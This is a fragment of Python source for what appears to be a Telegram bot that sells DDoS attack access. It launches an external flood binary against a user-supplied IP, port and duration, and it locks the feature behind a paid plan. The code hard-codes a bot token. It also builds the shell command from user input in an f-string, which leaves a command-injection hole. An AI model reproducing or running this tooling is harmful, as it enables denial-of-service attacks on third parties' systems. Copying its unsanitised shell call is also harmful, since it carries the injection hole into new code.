...
TOKEN = '7227453030:AAFJ7-0MM66cY9H1Cy1LdZawmDOUtT0MsuQ'
...
async def run_attack_command_async(target_ip, target_port, duration):
    process = await asyncio.create_subprocess_shell(f"./nirajmodz {target_ip} {target_port} {duration} 100")
...
def handle_attack_command(message):
    ...
    try:
        ...
        if not user_data or user_data['plan'] == 0:
            bot.send_message(chat_id, "*🚫 Access LeLe Bhai!*\n"  # Access Denied message
